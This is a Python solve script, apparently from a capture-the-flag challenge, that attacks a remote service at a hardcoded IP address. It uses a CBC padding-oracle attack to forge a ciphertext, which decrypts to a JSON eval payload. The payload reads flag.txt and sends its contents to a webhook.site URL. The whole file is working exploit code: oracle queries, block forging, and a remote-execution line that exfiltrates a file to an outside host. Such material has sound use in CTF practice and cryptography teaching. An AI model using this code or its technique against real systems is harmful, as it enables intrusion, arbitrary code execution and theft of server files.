#!/usr/bin/env python3
import sys, os, socket, binascii, json

HOST = "52.59.124.14"
PORT = 5102
BLOCK = 16

# Set your webhook URL here, or pass via CLI:
WEBHOOK_URL = "https://webhook.site/98513cb7-0ee9-4a10-aaac-cb6eff1b04e7"

def recv_until(sock, prompt=b"input cipher (hex): "):
    data = b""
    while not data.endswith(prompt):
        ch = sock.recv(1)
        if not ch:
            break
        data += ch
    return data

def recv_line(sock):
    data = b""
    while not data.endswith(b"\n"):
        ch = sock.recv(1)
        if not ch:
            break
        data += ch
    return data.decode(errors="ignore").strip()

def oracle(sock, ct: bytes) -> str:
    """
    Return:
      - 'pad' if padding accepted (no valid json | something else went wrong)
      - 'bad' if invalid padding or unknown
    """
    recv_until(sock)
    sock.sendall(binascii.hexlify(ct) + b"\n")
    line = recv_line(sock).lower()
    if "invalid padding" in line:
        return "bad"
    if "no valid json" in line or "something else went wrong" in line:
        return "pad"
    return "bad"

def recover_intermediate(sock, C_last: bytes) -> bytes:
    """
    Recover I = Dec_K(C_last) using a 2-block query: D || C_last (Vaudenay).
    """
    assert len(C_last) == BLOCK
    D = bytearray(BLOCK)
    I = bytearray(BLOCK)

    for padlen in range(1, BLOCK + 1):
        idx = BLOCK - padlen
        # enforce suffix padding
        for j in range(BLOCK - 1, idx, -1):
            D[j] = I[j] ^ padlen

        found = False
        for guess in range(256):
            D[idx] = guess
            if oracle(sock, bytes(D) + C_last) == "pad":
                I[idx] = guess ^ padlen
                found = True
                break
        if not found:
            raise RuntimeError(f"Byte recovery failed at index {idx}")
    return bytes(I)

def pkcs7_pad(b: bytes, block=16) -> bytes:
    padlen = block - (len(b) % block)
    if padlen == 0:
        padlen = block
    return b + bytes([padlen]) * padlen

def split_blocks(b: bytes, n=16):
    return [b[i:i+n] for i in range(0, len(b), n)]

def connect():
    s = socket.socket()
    s.connect((HOST, PORT))
    return s

def verify_chain(IV: bytes, C: list[bytes], I: list[bytes], target: bytes):
    """Check that I1^IV || I2^C1 || ... equals target plaintext."""
    P_blocks = split_blocks(target, BLOCK)
    assert len(P_blocks) == len(C) == len(I)
    rec = []
    rec.append(bytes(a ^ b for a, b in zip(I[0], IV)))
    for i in range(1, len(C)):
        rec.append(bytes(a ^ b for a, b in zip(I[i], C[i-1])))
    if b"".join(rec) != target:
        for bi, (x, y) in enumerate(zip(split_blocks(b"".join(rec)), P_blocks)):
            if x != y:
                raise AssertionError(f"Chain mismatch at block {bi}\nGot : {x}\nWant: {y}")
    return True

def build_payload_json(webhook_url: str) -> bytes:
    # Single-expression, eval-safe HTTPS callback with URL-encoded flag
    expr = "__import__('urllib.request').urlopen('{}?d='+__import__('urllib.parse').quote(open('flag.txt').read()))".format(
        webhook_url
    )
    payload = {"command": expr}
    return json.dumps(payload, separators=(',', ':')).encode()

def main():
    if WEBHOOK_URL.startswith("http://"):
        print("[!] Use HTTPS on webhook.site")
        return

    # 1) Target plaintext (JSON) + PKCS#7
    P = build_payload_json(WEBHOOK_URL)
    P = pkcs7_pad(P, BLOCK)
    P_blocks = split_blocks(P, BLOCK)
    n = len(P_blocks)
    print(f"[+] Target plaintext length {len(P)} bytes, {n} blocks")

    # 2) Construct blocks from right to left
    C = [None] * n
    I = [None] * n

    # Choose last block and recover its intermediate
    C[n-1] = os.urandom(BLOCK)
    s = connect()
    try:
        I[n-1] = recover_intermediate(s, C[n-1])
        print(f"[+] Recovered I_{n}")
    finally:
        try: recv_until(s); s.sendall(b"exit\n")
        except Exception: pass
        s.close()

    # Walk left: set C[i-1] = I[i] ^ P[i], then recover I[i-1]
    for i in range(n-1, 0, -1):
        C[i-1] = bytes(a ^ b for a, b in zip(I[i], P_blocks[i]))
        s = connect()
        try:
            I[i-1] = recover_intermediate(s, C[i-1])
            print(f"[+] Recovered I_{i}")
        finally:
            try: recv_until(s); s.sendall(b"exit\n")
            except Exception: pass
            s.close()

    # Compute IV
    IV = bytes(a ^ b for a, b in zip(I[0], P_blocks[0]))

    # 3) Self-check
    verify_chain(IV, C, I, P)
    print("[+] Chain verified locally against target plaintext")

    # 4) Send final ciphertext
    final_ct = IV + b"".join(C)
    print(f"[+] Final ciphertext ready ({len(final_ct)} bytes)")

    s = connect()
    try:
        recv_until(s)
        s.sendall(binascii.hexlify(final_ct) + b"\n")
        line = recv_line(s)
        print(f"[server] {line}")
    finally:
        try: recv_until(s); s.sendall(b"exit\n")
        except Exception: pass
        s.close()

    print("[+] Sent exploit. Check your webhook for d=ENO%7B...%7D")

if __name__ == "__main__":
    # Allow webhook URL override: python3 solve.py "https://webhook.site/...."
    if len(sys.argv) >= 2:
        WEBHOOK_URL = sys.argv[1]
    print(f"[i] Webhook URL: {WEBHOOK_URL}")
    main()
